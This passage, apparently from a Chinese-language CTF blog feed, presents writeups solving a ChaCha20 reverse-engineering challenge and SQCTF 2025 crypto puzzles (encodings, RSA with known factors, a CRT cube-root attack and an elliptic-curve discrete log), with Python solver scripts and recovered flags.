class="line">  int j; // [rsp+84h] [rbp+64h]</span><br><span class="line">  int k; // [rsp+A4h] [rbp+84h]</span><br><span class="line">  int m; // [rsp+C4h] [rbp+A4h]</span><br><span class="line">  int *v26; // [rsp+198h] [rbp+178h]</span><br><span class="line"></span><br><span class="line">  v2 = &amp;v6;</span><br><span class="line">  for ( i = 50LL; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = -858993460;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1800770F7((__int64)&amp;unk_1801AD0A3);</span><br><span class="line">  sub_1800757E3((__int64)&amp;v7, a1, 64LL);</span><br><span class="line">  for ( j = 0; j &lt; 20; j += 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = &amp;v7;</span><br><span class="line">    sub_18007B4B0(&amp;v7, v11, v15, v19);</span><br><span class="line">    v26 = (int *)v8;</span><br><span class="line">    sub_18007B4B0(v8, v12, v16, v20);</span><br><span class="line">    v26 = (int *)v9;</span><br><span class="line">    sub_18007B4B0(v9, v13, v17, v21);</span><br><span class="line">    v26 = (int *)v10;</span><br><span class="line">    sub_18007B4B0(v10, v14, v18, v22);</span><br><span class="line">    v26 = &amp;v7;</span><br><span class="line">    sub_18007B4B0(&amp;v7, v12, v17, v22);</span><br><span class="line">    v26 = (int *)v8;</span><br><span class="line">    sub_18007B4B0(v8, v13, v18, v19);</span><br><span class="line">    v26 = (int *)v9;</span><br><span class="line">    sub_18007B4B0(v9, v14, v15, v20);</span><br><span class="line">    v26 = (int *)v10;</span><br><span class="line">    sub_18007B4B0(v10, v11, v16, v21);</span><br><span class="line">  &#125;</span><br><span class="line">  for ( k = 0; k &lt; 16; ++k )</span><br><span class="line">    *(_DWORD *)&amp;v8[4 * k - 4] += *(_DWORD *)(a1 + 4LL * k);</span><br><span class="line">  for ( m = 0; m &lt; 16; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + 4 * m) = v8[4 * m - 4];</span><br><span class="line">    *(_BYTE *)(a2 + 4 * m + 1) = BYTE1(*(_DWORD *)&amp;v8[4 * m - 4]);</span><br><span class="line">    *(_BYTE *)(a2 + 4 * m + 2) = BYTE2(*(unsigned int *)&amp;v8[4 * m - 4]);</span><br><span class="line">    *(_BYTE *)(a2 + 4 * m + 3) = HIBYTE(*(unsigned int *)&amp;v8[4 * m - 4]);</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(_DWORD *)(a1 + 48);</span><br><span class="line">  return sub_180076850((__int64)v5, (__int64)&amp;unk_180167C40);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.beiko.top/blog/2025/4/28/image-17.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-18.png"></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-19.png"></p><p>最终逆向脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_quarter_round</span>(<span class="params">a, b, c, d</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ChaCha20四分之一轮实现&quot;&quot;&quot;</span></span><br><span class="line">    a = (a + b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    d ^= a</span><br><span class="line">    d = ((d &lt;&lt; <span class="number">16</span>) | (d &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># ROL16</span></span><br><span class="line">    c = (c + d) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    b ^= c</span><br><span class="line">    b = ((b &lt;&lt; <span class="number">12</span>) | (b &gt;&gt; <span class="number">20</span>)) &amp; <span class="number">0xFFFFFFFF</span>  <span class="comment"># ROL12</span></span><br><span class="line">    a = (a + b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    d ^= a</span><br><span class="line">    d = ((d &lt;&lt; <span class="number">8</span>) | (d &gt;&gt; <span class="number">24</span>)) &amp; <span class="number">0xFFFFFFFF</span>   <span class="comment"># ROL8</span></span><br><span class="line">    c = (c + d) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    b ^= c</span><br><span class="line">    b = ((b &lt;&lt; <span class="number">7</span>) | (b &gt;&gt; <span class="number">25</span>)) &amp; <span class="number">0xFFFFFFFF</span>   <span class="comment"># ROL7</span></span><br><span class="line">    <span class="keyword">return</span> a, b, c, d</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_block</span>(<span class="params">key, counter, nonce</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成64字节密钥流（修正状态矩阵）&quot;&quot;&quot;</span></span><br><span class="line">    constants = [<span class="number">0x61707865</span>, <span class="number">0x3320646e</span>, <span class="number">0x79622d32</span>, <span class="number">0x6b206574</span>]</span><br><span class="line">    key_words = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;8I&#x27;</span>, key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保状态矩阵有16个元素</span></span><br><span class="line">    state = [</span><br><span class="line">        constants[<span class="number">0</span>], constants[<span class="number">1</span>], constants[<span class="number">2</span>], constants[<span class="number">3</span>],</span><br><span class="line">        *key_words[:<span class="number">4</span>],          <span class="comment"># 密钥前4字</span></span><br><span class="line">        *key_words[<span class="number">4</span>:<span class="number">8</span>],         <span class="comment"># 密钥后4字</span></span><br><span class="line">        counter,                 <span class="comment"># 块计数器（32位）</span></span><br><span class="line">        nonce[<span class="number">0</span>], nonce[<span class="number">1</span>], nonce[<span class="number">2</span>]  <span class="comment"># Nonce为3个32位字</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    initial_state = state.copy()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 20轮混淆处理</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="comment"># 列处理</span></span><br><span class="line">        state[<span class="number">0</span>], state[<span class="number">4</span>], state[<span class="number">8</span>], state[<span class="number">12</span>] = chacha20_quarter_round(state[<span class="number">0</span>], state[<span class="number">4</span>], state[<span class="number">8</span>], state[<span class="number">12</span>])</span><br><span class="line">        state[<span class="number">1</span>], state[<span class="number">5</span>], state[<span class="number">9</span>], state[<span class="number">13</span>] = chacha20_quarter_round(state[<span class="number">1</span>], state[<span class="number">5</span>], state[<span class="number">9</span>], state[<span class="number">13</span>])</span><br><span class="line">        state[<span class="number">2</span>], state[<span class="number">6</span>], state[<span class="number">10</span>], state[<span class="number">14</span>] = chacha20_quarter_round(state[<span class="number">2</span>], state[<span class="number">6</span>], state[<span class="number">10</span>], state[<span class="number">14</span>])</span><br><span class="line">        state[<span class="number">3</span>], state[<span class="number">7</span>], state[<span class="number">11</span>], state[<span class="number">15</span>] = chacha20_quarter_round(state[<span class="number">3</span>], state[<span class="number">7</span>], state[<span class="number">11</span>], state[<span class="number">15</span>])</span><br><span class="line">        <span class="comment"># 行处理</span></span><br><span class="line">        state[<span class="number">0</span>], state[<span class="number">5</span>], state[<span class="number">10</span>], state[<span class="number">15</span>] = chacha20_quarter_round(state[<span class="number">0</span>], state[<span class="number">5</span>], state[<span class="number">10</span>], state[<span class="number">15</span>])</span><br><span class="line">        state[<span class="number">1</span>], state[<span class="number">6</span>], state[<span class="number">11</span>], state[<span class="number">12</span>] = chacha20_quarter_round(state[<span class="number">1</span>], state[<span class="number">6</span>], state[<span class="number">11</span>], state[<span class="number">12</span>])</span><br><span class="line">        state[<span class="number">2</span>], state[<span class="number">7</span>], state[<span class="number">8</span>], state[<span class="number">13</span>] = chacha20_quarter_round(state[<span class="number">2</span>], state[<span class="number">7</span>], state[<span class="number">8</span>], state[<span class="number">13</span>])</span><br><span class="line">        state[<span class="number">3</span>], state[<span class="number">4</span>], state[<span class="number">9</span>], state[<span class="number">14</span>] = chacha20_quarter_round(state[<span class="number">3</span>], state[<span class="number">4</span>], state[<span class="number">9</span>], state[<span class="number">14</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 叠加初始状态并序列化</span></span><br><span class="line">    block = [(state[i] + initial_state[i]) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;16I&#x27;</span>, *block)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">enc_path, password</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密主函数（修正Nonce）&quot;&quot;&quot;</span></span><br><span class="line">    key = password.encode().ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)[:<span class="number">32</span>]</span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    nonce = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># Nonce扩展为3个32位字</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(enc_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            key_stream = chacha20_block(key, counter, nonce)</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            chunk = fin.read(<span class="number">64</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            decrypted = <span class="built_in">bytes</span>( ((c - <span class="number">1</span>) % <span class="number">0x100</span>) ^ key_stream[i] <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(chunk) )</span><br><span class="line">            <span class="built_in">print</span>(decrypted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decrypt_file(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;qewuri&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag&#123;sierting_666_fpdsajf[psdfljnwqrlqwhperhqwoeiurhqweourhp&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQCTF 2025 Writeup</title>
      <link href="/blog/2025/04/13/CTF-WP/SQCTF%202025/"/>
      <url>/blog/2025/04/13/CTF-WP/SQCTF%202025/</url>
      
        <content type="html"><![CDATA[<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="base？"><a href="#base？" class="headerlink" title="base？"></a>base？</h3><p><img src="https://img.beiko.top/blog/2025/4/28/image-0.png"></p><h3 id="别阴阳我了行吗？"><a href="#别阴阳我了行吗？" class="headerlink" title="别阴阳我了行吗？"></a>别阴阳我了行吗？</h3><p>阴阳怪气解码，然后把中文感叹号改成英文感叹号</p><p><img src="https://img.beiko.top/blog/2025/4/28/image-1.png"></p><h3 id="春风得意马蹄疾"><a href="#春风得意马蹄疾" class="headerlink" title="春风得意马蹄疾"></a>春风得意马蹄疾</h3><p>套了四层社会主义核心价值观解密</p><p><a href="https://ctf.bugku.com/tool/cvecode">https://ctf.bugku.com/tool/cvecode</a></p><p><img src="https://img.beiko.top/blog/2025/4/28/image-2.png"></p><h3 id="简单RSA"><a href="#简单RSA" class="headerlink" title="简单RSA"></a>简单RSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为上一步我们已经求得 p, q</span></span><br><span class="line">p = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261</span></span><br><span class="line">q = <span class="number">85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n) = (p-1)*(q-1)</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 d，使得 d * e ≡ 1 (mod φ(n))</span></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算逆元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    gcd, x1, y1 = egcd(b % a, a)</span><br><span class="line">    x = y1 - (b // a) * x1</span><br><span class="line">    y = x1</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    gcd, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;逆元不存在&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">d = modinv(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用 d 对密文进行 RSA 解密： m = c^d mod n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 m 转换为字节串（假设原消息使用的是大端字节序）</span></span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m_bytes)</span><br><span class="line"><span class="comment"># SQCTF&#123;be7e48547356cdf16649fd29e0ff9e1f&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的模数和密文</span></span><br><span class="line">n1 = <span class="number">64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681</span></span><br><span class="line">n2 = <span class="number">82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063</span></span><br><span class="line">n3 = <span class="number">62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165</span></span><br><span class="line">c2 = <span class="number">58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023</span></span><br><span class="line">c3 = <span class="number">23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认模数两两互质</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n1, n2) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n1, n3) == <span class="number">1</span></span><br><span class="line"><span class="keyword">assert</span> math.gcd(n2, n3) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用CRT合并c1和c2</span></span><br><span class="line">delta = (c2 - c1) % n2</span><br><span class="line">inv_n1_mod_n2 = <span class="built_in">pow</span>(n1, -<span class="number">1</span>, n2)</span><br><span class="line">k = (delta * inv_n1_mod_n2) % n2</span><br><span class="line">x12 = c1 + k * n1</span><br><span class="line">M12 = n1 * n2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将合并结果与c3合并</span></span><br><span class="line">delta3 = (c3 - x12) % n3</span><br><span class="line">inv_M12_mod_n3 = <span class="built_in">pow</span>(M12, -<span class="number">1</span>, n3)</span><br><span class="line">k3 = (delta3 * inv_M12_mod_n3) % n3</span><br><span class="line">x123 = x12 + k3 * M12</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_cube_root</span>(<span class="params">n</span>):</span><br><span class="line">    low, high = <span class="number">0</span>, n</span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        mid_cubed = mid ** <span class="number">3</span>  <span class="comment"># 修正后的行</span></span><br><span class="line">        <span class="keyword">if</span> mid_cubed &lt; n:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> mid_cubed &gt; n:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> high</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解立方根</span></span><br><span class="line">cube_root = find_cube_root(x123)</span><br><span class="line"><span class="keyword">if</span> cube_root ** <span class="number">3</span> == x123:</span><br><span class="line">    m = cube_root</span><br><span class="line">    flag_bytes = long_to_bytes(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag Bytes:&quot;</span>, flag_bytes)</span><br><span class="line"><span class="comment"># SQCTF&#123;CRT_Unl0cks_RSA_Eff1c13ncy&#125;</span></span><br></pre></td></tr></table></figure><h3 id="失落矿洞中的密码"><a href="#失落矿洞中的密码" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, isPrime</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">p = <span class="number">7654319</span></span><br><span class="line">a = <span class="number">1234577</span></span><br><span class="line">b = <span class="number">3213242</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_on_curve</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    x, y = P</span><br><span class="line">    <span class="keyword">return</span> (y * y - (x**<span class="number">3</span> + a * x + b)) % p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> Q</span><br><span class="line">    <span class="keyword">if</span> Q <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> P</span><br><span class="line">    x1, y1 = P</span><br><span class="line">    x2, y2 = Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> (y1 + y2) % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> P == Q:</span><br><span class="line">        l = (<span class="number">3</span> * x1 * x1 + a) * inverse(<span class="number">2</span> * y1, p) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = (y2 - y1) * inverse(x2 - x1, p) % p</span><br><span class="line"></span><br><span class="line">    x3 = (l * l - x1 - x2) % p</span><br><span class="line">    y3 = (l * (x1 - x3) - y1) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">point_neg</span>(<span class="params">P</span>):</span><br><span class="line">    <span class="keyword">if</span> P <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    x, y = P</span><br><span class="line">    <span class="keyword">return</span> (x, (-y) % p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scalar_mult</span>(<span class="params">k, P</span>):</span><br><span class="line">    R = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            R = point_add(R, P)</span><br><span class="line">        P = point_add(P, P)</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> R</span><br><span class="line"></span><br><span class="line"><span class="comment"># 椭圆曲线参数</span></span><br><span class="line">G = (<span class="number">5234568</span>, <span class="number">2287747</span>)</span><br><span class="line">PublicKey = (<span class="number">2366653</span>, <span class="number">1424308</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Baby Step Giant Step 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">P, Q, order_estimate</span>):</span><br><span class="line">    m = math.isqrt(order_estimate) + <span class="number">1</span></span><br><span class="line">    baby_steps = &#123;&#125;</span><br><span class="line">    R = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        baby_steps[R] = j</span><br><span class="line">        R = point_add(R, P) <span class="keyword">if</span> R <span class="keyword">else</span> P</span><br><span class="line"></span><br><span class="line">    mP = scalar_mult(m, point_neg(P))</span><br><span class="line">    R = Q</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">if</span> R <span class="keyword">in</span> baby_steps:</span><br><span class="line">            <span class="keyword">return</span> i * m + baby_steps[R]</span><br><span class="line">        R = point_add(R, mP)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 估计 G 的阶</span></span><br><span class="line">order_estimate = p  <span class="comment"># 上界</span></span><br><span class="line">secret = bsgs(G, PublicKey, order_estimate)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] secretKey =&quot;</span>, secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">crypted_data = [(<span class="number">5081741</span>, <span class="number">6744615</span>), (<span class="number">610619</span>, <span class="number">6218</span>)]</span><br><span class="line">C1, C2 = crypted_data</span><br><span class="line"></span><br><span 